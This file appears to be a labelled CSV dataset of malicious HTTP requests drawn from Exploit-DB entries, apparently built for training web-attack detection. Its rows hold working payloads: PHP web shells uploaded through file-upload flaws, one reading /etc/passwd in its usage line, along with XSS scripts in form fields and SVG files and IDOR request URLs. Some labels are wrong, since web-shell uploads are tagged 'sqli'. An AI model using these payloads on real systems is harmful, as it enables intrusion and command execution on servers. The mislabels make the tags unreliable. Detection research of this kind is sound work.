"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_luongvd_000028","1","exploitdb","https://www.exploit-db.com/exploits/51924","POST","https://192.168.1.44/endpoints/subscription/add.php","/endpoints/subscription/add.php","","[[""Host"", ""192.168.1.44""]]","User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.1.44/

Content-Type: multipart/form-data; boundary=---------------------------29251442139477260933920738324

Origin: http://192.168.1.44

Content-Length: 7220

Connection: close

Cookie: theme=light; language=en; PHPSESSID=6a3e5adc1b74b0f1870bbfceb16cda4b; theme=light

-----------------------------29251442139477260933920738324

Content-Disposition: form-data; name=""name""

test

-----------------------------29251442139477260933920738324

Content-Disposition: form-data; name=""logo""; filename=""revshell.php""

Content-Type: image/jpeg

GIF89a;

<?php
system($_GET['cmd']);
?>

-----------------------------29251442139477260933920738324

Content-Disposition: form-data; name=""logo-url""

----- SNIP -----

5) You will get the response that your file was uploaded ok:

{""status"":""Success"",""message"":""Subscription updated successfully""}


6) Your file will be located in:
http://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php","POST /endpoints/subscription/add.php HTTP/1.1

Host: 192.168.1.44

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://192.168.1.44/

Content-Type: multipart/form-data; boundary=---------------------------29251442139477260933920738324

Origin: http://192.168.1.44

Content-Length: 7220

Connection: close

Cookie: theme=light; language=en; PHPSESSID=6a3e5adc1b74b0f1870bbfceb16cda4b; theme=light

-----------------------------29251442139477260933920738324

Content-Disposition: form-data; name=""name""

test

-----------------------------29251442139477260933920738324

Content-Disposition: form-data; name=""logo""; filename=""revshell.php""

Content-Type: image/jpeg

GIF89a;

<?php
system($_GET['cmd']);
?>

-----------------------------29251442139477260933920738324

Content-Disposition: form-data; name=""logo-url""

----- SNIP -----

5) You will get the response that your file was uploaded ok:

{""status"":""Success"",""message"":""Subscription updated successfully""}


6) Your file will be located in:
http://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php","sqli"
"pos_luongvd_000029","1","exploitdb","https://www.exploit-db.com/exploits/51820","GET","https://school.moodledemo.net/blog/index.php?userid=3","/blog/index.php","userid=3","[]","","https://school.moodledemo.net/blog/index.php?userid=3","idor"
"pos_luongvd_000030","1","exploitdb","https://www.exploit-db.com/exploits/51820","GET","https://school.moodledemo.net/blog/index.php?userid=14","/blog/index.php","userid=14","[]","","https://school.moodledemo.net/blog/index.php?userid=14","idor"
"pos_luongvd_000031","1","exploitdb","https://www.exploit-db.com/exploits/51779","POST","https://192.168.1.36/pms/users.php","/pms/users.php","","[[""Host"", ""192.168.1.36""]]","User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: multipart/form-data; boundary=---------------------------421755697017784551042596452367

Content-Length: 1054

Origin: http://192.168.1.36

Connection: close

Referer: http://192.168.1.36/pms/users.php

Upgrade-Insecure-Requests: 1



-----------------------------421755697017784551042596452367

Content-Disposition: form-data; name=""display_name""



sefa7

-----------------------------421755697017784551042596452367

Content-Disposition: form-data; name=""user_name""



sefa7

-----------------------------421755697017784551042596452367

Content-Disposition: form-data; name=""password""



sefa7

-----------------------------421755697017784551042596452367

Content-Disposition: form-data; name=""profile_picture""; filename=""simple-backdoor.php""

Content-Type: application/x-php



<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo ""<pre>"";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo ""</pre>"";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->


-----------------------------421755697017784551042596452367

Content-Disposition: form-data; name=""save_user""





-----------------------------421755697017784551042596452367--


## After the file upload request sent by attacker, Application adds a random number to the beginning of the file to be uploaded. Malicious file can be seen under the path /pms/users.php without any authentication.

## With the request http://192.168.1.36/pms/user_images/1696676940simple-backdoor.php?cmd=whoami the attacker can execute arbitrary command on the application server.","POST /pms/users.php HTTP/1.1

Host: 192.168.1.36

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: multipart/form-data; boundary=---------------------------421755697017784551042596452367

Content-Length: 1054

Origin: http://192.168.1.36

Connection: close

Referer: http://192.168.1.36/pms/users.php

Upgrade-Insecure-Requests: 1



-----------------------------421755697017784551042596452367

Content-Disposition: form-data; name=""display_name""



sefa7

-----------------------------421755697017784551042596452367

Content-Disposition: form-data; name=""user_name""



sefa7

-----------------------------421755697017784551042596452367

Content-Disposition: form-data; name=""password""



sefa7

-----------------------------421755697017784551042596452367

Content-Disposition: form-data; name=""profile_picture""; filename=""simple-backdoor.php""

Content-Type: application/x-php



<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo ""<pre>"";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo ""</pre>"";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->


-----------------------------421755697017784551042596452367

Content-Disposition: form-data; name=""save_user""





-----------------------------421755697017784551042596452367--


## After the file upload request sent by attacker, Application adds a random number to the beginning of the file to be uploaded. Malicious file can be seen under the path /pms/users.php without any authentication.

## With the request http://192.168.1.36/pms/user_images/1696676940simple-backdoor.php?cmd=whoami the attacker can execute arbitrary command on the application server.","sqli"
"pos_luongvd_000032","1","exploitdb","https://www.exploit-db.com/exploits/51715","POST","https://demo.jorani.org/session/login","/session/login","","[[""Host"", ""demo.jorani.org""], [""Accept-Encoding"", ""gzip, deflate""], [""Accept"", ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7""], [""Accept-Language"", ""en-US;q=0.9,en;q=0.8""], [""User-Agent"", ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""], [""Connection"", ""close""], [""Cache-Control"", ""max-age=0""], [""Cookie"", ""csrf_cookie_jorani=9b4b02ece59e0f321cd0324a633b5dd2;""], [""Origin"", ""http://demo.jorani.org""], [""Upgrade-Insecure-Requests"", ""1""], [""Referer"", ""http://demo.jorani.org/session/login""], [""Content-Type"", ""application/x-www-form-urlencoded""], [""Sec-CH-UA"", ""\"".Not/A)Brand\"";v=\""99\"", \""Google Chrome\"";v=\""116\"", \""Chromium\"";v=\""116\""""], [""Sec-CH-UA-Platform"", ""Windows""], [""Sec-CH-UA-Mobile"", ""?0""], [""Content-Length"", ""183""]]","csrf_test_jorani=9b4b02ece59e0f321cd0324a633b5dd2&last_page=session%2Flogin&language=en-GBarh5l%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3ennois&login=bbalet&CipheredValue=

```

[+]Response:
```HTTP
HTTP/1.1 200 OK
date: Sun, 27 Aug 2023 06:03:04 GMT
content-type: text/html; charset=UTF-8
Content-Length: 681
server: Apache
x-powered-by: PHP/8.2
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate
pragma: no-cache
set-cookie: csrf_cookie_jorani=9b4b02ece59e0f321cd0324a633b5dd2;
expires=Sun, 27 Aug 2023 08:03:04 GMT; Max-Age=7200; path=/;
SameSite=Strict
set-cookie: jorani_session=9ae823ffa74d722c809f6bda69954593483f2cfd;
expires=Sun, 27 Aug 2023 08:03:04 GMT; Max-Age=7200; path=/; HttpOnly;
SameSite=Lax
last-modified: Sun, 27 Aug 2023 06:03:04 GMT
vary: Accept-Encoding
cache-control: private, no-cache, no-store, proxy-revalidate,
no-transform, must-revalidate
pragma: no-cache
x-iplb-request-id: 3E497A1D:118A_D5BA2118:0050_64EAE718_12C0:1FBA1
x-iplb-instance: 27474
connection: close


<div style=""border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;"">

<h4>A PHP Error was encountered</h4>

<p>Severity: 8192</p>
<p>Message:  strlen(): Passing null to parameter #1 ($string) of type
string is deprecated</p>
<p>Filename: controllers/Connection.php</p>
<p>Line Number: 126</p>


</div>
<div style=""border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;"">

<h4>A PHP Error was encountered</h4>

<p>Severity: Warning</p>
<p>Message:  Cannot modify header information - headers already sent
by (output started at
/home/decouvric/demo.jorani.org/system/core/Exceptions.php:272)</p>
<p>Filename: helpers/url_helper.php</p>
<p>Line Number: 565</p>


</div>
```


## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/Jorani/2023/Jorani-v1.0.3-%C2%A92014-2023-Benjamin-BALET-XSS-Reflected-Information-Disclosure)

## Proof and Exploit:
[href](https://www.nu11secur1ty.com/2023/08/jorani-v103-2014-2023-benjamin-balet.html)

## Time spend:
01:35:00","POST /session/login HTTP/1.1
Host: demo.jorani.org
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111
Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: csrf_cookie_jorani=9b4b02ece59e0f321cd0324a633b5dd2;
jorani_session=fbc630d2510ffdd2a981ccfe97301b1b90ab47dc#ATTACK
Origin: http://demo.jorani.org
Upgrade-Insecure-Requests: 1
Referer: http://demo.jorani.org/session/login
Content-Type: application/x-www-form-urlencoded
Sec-CH-UA: "".Not/A)Brand"";v=""99"", ""Google Chrome"";v=""116"", ""Chromium"";v=""116""
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
Content-Length: 183

csrf_test_jorani=9b4b02ece59e0f321cd0324a633b5dd2&last_page=session%2Flogin&language=en-GBarh5l%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3ennois&login=bbalet&CipheredValue=

```

[+]Response:
```HTTP
HTTP/1.1 200 OK
date: Sun, 27 Aug 2023 06:03:04 GMT
content-type: text/html; charset=UTF-8
Content-Length: 681
server: Apache
x-powered-by: PHP/8.2
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate
pragma: no-cache
set-cookie: csrf_cookie_jorani=9b4b02ece59e0f321cd0324a633b5dd2;
expires=Sun, 27 Aug 2023 08:03:04 GMT; Max-Age=7200; path=/;
SameSite=Strict
set-cookie: jorani_session=9ae823ffa74d722c809f6bda69954593483f2cfd;
expires=Sun, 27 Aug 2023 08:03:04 GMT; Max-Age=7200; path=/; HttpOnly;
SameSite=Lax
last-modified: Sun, 27 Aug 2023 06:03:04 GMT
vary: Accept-Encoding
cache-control: private, no-cache, no-store, proxy-revalidate,
no-transform, must-revalidate
pragma: no-cache
x-iplb-request-id: 3E497A1D:118A_D5BA2118:0050_64EAE718_12C0:1FBA1
x-iplb-instance: 27474
connection: close


<div style=""border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;"">

<h4>A PHP Error was encountered</h4>

<p>Severity: 8192</p>
<p>Message:  strlen(): Passing null to parameter #1 ($string) of type
string is deprecated</p>
<p>Filename: controllers/Connection.php</p>
<p>Line Number: 126</p>


</div>
<div style=""border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;"">

<h4>A PHP Error was encountered</h4>

<p>Severity: Warning</p>
<p>Message:  Cannot modify header information - headers already sent
by (output started at
/home/decouvric/demo.jorani.org/system/core/Exceptions.php:272)</p>
<p>Filename: helpers/url_helper.php</p>
<p>Line Number: 565</p>


</div>
```


## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/Jorani/2023/Jorani-v1.0.3-%C2%A92014-2023-Benjamin-BALET-XSS-Reflected-Information-Disclosure)

## Proof and Exploit:
[href](https://www.nu11secur1ty.com/2023/08/jorani-v103-2014-2023-benjamin-balet.html)

## Time spend:
01:35:00","xss"
"pos_luongvd_000033","1","exploitdb","https://www.exploit-db.com/exploits/51668","POST","https://172.16.110.130:8888/lucee/admin/web.cfm?action=services.gateway&action2=create","/lucee/admin/web.cfm","action=services.gateway&action2=create","[[""Host"", ""172.16.110.130:8888""], [""User-Agent"", ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0""], [""Accept"", ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8""], [""Accept-Language"", ""en-US,en;q=0.5""], [""Accept-Encoding"", ""gzip, deflate""], [""Content-Type"", ""application/x-www-form-urlencoded""], [""Content-Length"", ""278""], [""Origin"", ""http://172.16.110.130:8888""], [""Connection"", ""close""], [""Referer"", ""http://172.16.110.130:8888/lucee/admin/web.cfm?action=services.gateway&action2=create""], [""Cookie"", ""cfid=ee75e255-5873-461d-a631-0d6db6adb066; cftoken=0; LUCEE_ADMIN_LANG=en; LUCEE_ADMIN_LASTPAGE=overview""], [""Upgrade-Insecure-Requests"", ""1""]]","name=AsynchronousEvents&class=&cfcPath=lucee.extension.gateway.AsynchronousEvents&id=a&_id=a&listenerCfcPath=lucee.extension.gateway.AsynchronousEventsListener&startupMode=automatic&custom_component=%3Fmsg%3D%3Cimg+src%3Dxss+onerror%3Dalert%28%27xssya%27%29%3E&mainAction=submit

[Affected Component]
Debugging-->Template
Service --> Search
Services  --> Event Gateway
Service --> Logging","POST /lucee/admin/web.cfm?action=services.gateway&action2=create HTTP/1.1
Host: 172.16.110.130:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 278
Origin: http://172.16.110.130:8888
Connection: close
Referer: http://172.16.110.130:8888/lucee/admin/web.cfm?action=services.gateway&action2=create
Cookie: cfid=ee75e255-5873-461d-a631-0d6db6adb066; cftoken=0; LUCEE_ADMIN_LANG=en; LUCEE_ADMIN_LASTPAGE=overview
Upgrade-Insecure-Requests: 1

name=AsynchronousEvents&class=&cfcPath=lucee.extension.gateway.AsynchronousEvents&id=a&_id=a&listenerCfcPath=lucee.extension.gateway.AsynchronousEventsListener&startupMode=automatic&custom_component=%3Fmsg%3D%3Cimg+src%3Dxss+onerror%3Dalert%28%27xssya%27%29%3E&mainAction=submit

[Affected Component]
Debugging-->Template
Service --> Search
Services  --> Event Gateway
Service --> Logging","xss"
"pos_luongvd_000034","1","exploitdb","https://www.exploit-db.com/exploits/51668","GET","http://172.16.110.130:8888/lucee/admin/server.cfm?action=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E","/lucee/admin/server.cfm","action=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E","[]","","http://172.16.110.130:8888/lucee/admin/server.cfm?action=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E","xss"
"pos_luongvd_000035","1","exploitdb","https://www.exploit-db.com/exploits/51626","POST","https://hostname/AvailabilityBookingCalendarPHP/index.php?controller=GzBooking&action=edit","/AvailabilityBookingCalendarPHP/index.php","controller=GzBooking&action=edit","[[""Host"", ""hostname""], [""User-Agent"", ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0""]]","[...]
edit_booking=1&calendars_price=900&extra_price=0&tax=10&deposit=91&promo_code=TEST%22%3E%3Cscript%3Ealert%28%60XSS%60%29%3C%2Fscript%3E&discount=0&total=910&create_booking=1
[...]

// HTTP response

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 205
[...]



// HTTP GET request to Bookings page","POST /AvailabilityBookingCalendarPHP/index.php?controller=GzBooking&action=edit HTTP/1.1
Host: hostname
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
[...]

[...]
edit_booking=1&calendars_price=900&extra_price=0&tax=10&deposit=91&promo_code=TEST%22%3E%3Cscript%3Ealert%28%60XSS%60%29%3C%2Fscript%3E&discount=0&total=910&create_booking=1
[...]

// HTTP response

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 205
[...]



// HTTP GET request to Bookings page","xss"
"pos_luongvd_000036","1","exploitdb","https://www.exploit-db.com/exploits/51626","GET","https://hostname/AvailabilityBookingCalendarPHP/index.php?controller=GzBooking&action=edit&id=2","/AvailabilityBookingCalendarPHP/index.php","controller=GzBooking&action=edit&id=2","[[""Host"", ""hostname""], [""User-Agent"", ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0""]]","
// HTTP response

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 33590
[...]

[...]
<label class=""control-label"" for=""promo_code"">Promo code:</label>
            <input id=""promo_code"" class=""form-control input-sm"" type=""text"" name=""promo_code"" size=""25"" value=TEST""><script>alert(`XSS`)</script>"" title=""Promo code"" placeholder="""">
        </div>
[...]



Unrestricted File Upload #1:


// SVG file contents

<?xml version=""1.0"" standalone=""no""?>
<!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"">

<svg version=""1.1"" baseProfile=""full"" xmlns=""http://www.w3.org/2000/svg"">
   <polygon id=""triangle"" points=""0,0 0,50 50,0"" fill=""#009900"" stroke=""#004400""/>
   <script type=""text/javascript"">
      alert(`XSS`);
   </script>
</svg>


Steps to Reproduce:

1. Browse My Account
2. Image Browse -> Upload
3. Then right click on image
4. Select Open Image in New Tab


// HTTP POST request","GET /AvailabilityBookingCalendarPHP/index.php?controller=GzBooking&action=edit&id=2 HTTP/1.1
Host: hostname
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
[...]


// HTTP response

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 33590
[...]

[...]
<label class=""control-label"" for=""promo_code"">Promo code:</label>
            <input id=""promo_code"" class=""form-control input-sm"" type=""text"" name=""promo_code"" size=""25"" value=TEST""><script>alert(`XSS`)</script>"" title=""Promo code"" placeholder="""">
        </div>
[...]



Unrestricted File Upload #1:


// SVG file contents

<?xml version=""1.0"" standalone=""no""?>
<!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"">

<svg version=""1.1"" baseProfile=""full"" xmlns=""http://www.w3.org/2000/svg"">
   <polygon id=""triangle"" points=""0,0 0,50 50,0"" fill=""#009900"" stroke=""#004400""/>
   <script type=""text/javascript"">
      alert(`XSS`);
   </script>
</svg>


Steps to Reproduce:

1. Browse My Account
2. Image Browse -> Upload
3. Then right click on image
4. Select Open Image in New Tab


// HTTP POST request","xss"
"pos_luongvd_000037","1","exploitdb","https://www.exploit-db.com/exploits/51626","POST","https://hostname/AvailabilityBookingCalendarPHP/index.php?controller=GzUser&action=edit&id=1","/AvailabilityBookingCalendarPHP/index.php","controller=GzUser&action=edit&id=1","[[""Host"", ""hostname""], [""User-Agent"", ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0""]]","[...]
-----------------------------13831219578609189241212424546
Content-Disposition: form-data; name=""img""; filename=""xss.svg""
Content-Type: image/svg+xml

<?xml version=""1.0"" standalone=""no""?>
<!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"">

<svg version=""1.1"" baseProfile=""full"" xmlns=""http://www.w3.org/2000/svg"">
   <polygon id=""triangle"" points=""0,0 0,50 50,0"" fill=""#009900"" stroke=""#004400""/>
   <script type=""text/javascript"">
      alert(`XSS`);
   </script>
</svg>
[...]


// HTTP response

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 190
[...]","POST /AvailabilityBookingCalendarPHP/index.php?controller=GzUser&action=edit&id=1 HTTP/1.1
Host: hostname
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
[...]

[...]
-----------------------------13831219578609189241212424546
Content-Disposition: form-data; name=""img""; filename=""xss.svg""
Content-Type: image/svg+xml

<?xml version=""1.0"" standalone=""no""?>
<!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"">

<svg version=""1.1"" baseProfile=""full"" xmlns=""http://www.w3.org/2000/svg"">
   <polygon id=""triangle"" points=""0,0 0,50 50,0"" fill=""#009900"" stroke=""#004400""/>
   <script type=""text/javascript"">
      alert(`XSS`);
   </script>
</svg>
[...]


// HTTP response

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 190
[...]","xss"
"pos_luongvd_000038","1","exploitdb","https://www.exploit-db.com/exploits/51591","POST","https://172.17.0.2/backend/system/settings/update/winter/backend/branding","/backend/system/settings/update/winter/backend/branding","","[[""Host"", ""172.17.0.2""], [""User-Agent"", ""Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0""], [""Accept"", ""application/json""], [""Accept-Language"", ""en-US,en;q=0.5""], [""Accept-Encoding"", ""gzip, deflate""], [""Cache-Control"", ""no-cache""], [""X-Requested-With"", ""XMLHttpRequest""], [""X-CSRF-TOKEN"", ""fk93d30vmHCawwgMlTRy97vPOxaf4iPphtUwioc2""], [""X-WINTER-REQUEST-HANDLER"", ""formLogo::onUpload""], [""Content-Type"", ""multipart/form-data; boundary=---------------------------186411693022341939203410401206""], [""Content-Length"", ""608""], [""Origin"", ""http://172.17.0.2""], [""Connection"", ""close""], [""Cookie"", ""admin_auth=eyJpdiI6IkV2dElCcWdsZStzWHc5cDVIcFZ1bnc9PSIsInZhbHVlIjoiVFkyV1k3UnBKUVNhSWF2NjVNclVCdXRwNklDQlFmenZXU2hUNi91T3c5aFRTTTR3VWQrVVJkZG5pcFZTTm1IMzFtZzkyWWpRV0FYRnJuZ1VoWXQ0Q2VUTGRScHhVcVRZdWtlSGYxa1kyZTh0RXVScFdySmF1VDZyZ1p0T1pYYWI5M1ZmVWtXUkhpeXg2U0l3NG9ZWHhnPT0iLCJtYWMiOiIyNzk0OTNlOWY2ODZhYjFhMGY0M2Y4Mzk0NjViY2FiOWQ0ZjNjMThlOTkxODZjYmFmNTZkZmY3MmZhMTM3YWJlIiwidGFnIjoiIn0%3D; BBLANG=en_US; winter_session=eyJpdiI6ImJFWHVEb0QrTmo5YjZYcml6Wm1jT3c9PSIsInZhbHVlIjoiQVdVZ3R4ajVUWUZXeS83dkhIQVFhVVYxOE1uajJQOVNzOUtwM1ZGcUFYOC9haHZFMlE2R0llNjZDWVR6eHZqbDZ5Z1J1akM5VkNaQUFZM1p5OGlZcjJFWTRaT21tRWdtcnJUUHJWRWg1QTZyRFhJbEdMc0h1SzZqaEphMFFSSDYiLCJtYWMiOiI0YzRkNWQwODVkMmI4ZmMxMTJlMGU5YjM2MWJkYjNiNjEwZmE2NTY4ZGQwYTdjNjAxMjRkMjRiN2M1NTBiOTNiIiwidGFnIjoiIn0%3D""]]","-----------------------------186411693022341939203410401206
Content-Disposition: form-data; name=""file_data""; filename=""image.svg""
Content-Type: image/svg+xml

<?xml version=""1.0"" standalone=""no""?>
<!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"">
<svg version=""1.1"" baseProfile=""full"" xmlns=""http://www.w3.org/2000/svg"">
   <polygon id=""triangle"" points=""0,0 0,50 50,0"" fill=""#009900"" stroke=""#004400""/>
   <script type=""text/javascript"">
      alert(document.domain);
   </script>
</svg>

-----------------------------186411693022341939203410401206--



|-----------------------------------------EOF-----------------------------------------","POST /backend/system/settings/update/winter/backend/branding HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
X-CSRF-TOKEN: fk93d30vmHCawwgMlTRy97vPOxaf4iPphtUwioc2
X-WINTER-REQUEST-HANDLER: formLogo::onUpload
Content-Type: multipart/form-data; boundary=---------------------------186411693022341939203410401206
Content-Length: 608
Origin: http://172.17.0.2
Connection: close
Cookie: admin_auth=eyJpdiI6IkV2dElCcWdsZStzWHc5cDVIcFZ1bnc9PSIsInZhbHVlIjoiVFkyV1k3UnBKUVNhSWF2NjVNclVCdXRwNklDQlFmenZXU2hUNi91T3c5aFRTTTR3VWQrVVJkZG5pcFZTTm1IMzFtZzkyWWpRV0FYRnJuZ1VoWXQ0Q2VUTGRScHhVcVRZdWtlSGYxa1kyZTh0RXVScFdySmF1VDZyZ1p0T1pYYWI5M1ZmVWtXUkhpeXg2U0l3NG9ZWHhnPT0iLCJtYWMiOiIyNzk0OTNlOWY2ODZhYjFhMGY0M2Y4Mzk0NjViY2FiOWQ0ZjNjMThlOTkxODZjYmFmNTZkZmY3MmZhMTM3YWJlIiwidGFnIjoiIn0%3D; BBLANG=en_US; winter_session=eyJpdiI6ImJFWHVEb0QrTmo5YjZYcml6Wm1jT3c9PSIsInZhbHVlIjoiQVdVZ3R4ajVUWUZXeS83dkhIQVFhVVYxOE1uajJQOVNzOUtwM1ZGcUFYOC9haHZFMlE2R0llNjZDWVR6eHZqbDZ5Z1J1akM5VkNaQUFZM1p5OGlZcjJFWTRaT21tRWdtcnJUUHJWRWg1QTZyRFhJbEdMc0h1SzZqaEphMFFSSDYiLCJtYWMiOiI0YzRkNWQwODVkMmI4ZmMxMTJlMGU5YjM2MWJkYjNiNjEwZmE2NTY4ZGQwYTdjNjAxMjRkMjRiN2M1NTBiOTNiIiwidGFnIjoiIn0%3D

-----------------------------186411693022341939203410401206
Content-Disposition: form-data; name=""file_data""; filename=""image.svg""
Content-Type: image/svg+xml

<?xml version=""1.0"" standalone=""no""?>
<!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"">
<svg version=""1.1"" baseProfile=""full"" xmlns=""http://www.w3.org/2000/svg"">
   <polygon id=""triangle"" points=""0,0 0,50 50,0"" fill=""#009900"" stroke=""#004400""/>
   <script type=""text/javascript"">
      alert(document.domain);
   </script>
</svg>

-----------------------------186411693022341939203410401206--



|-----------------------------------------EOF-----------------------------------------","sqli"
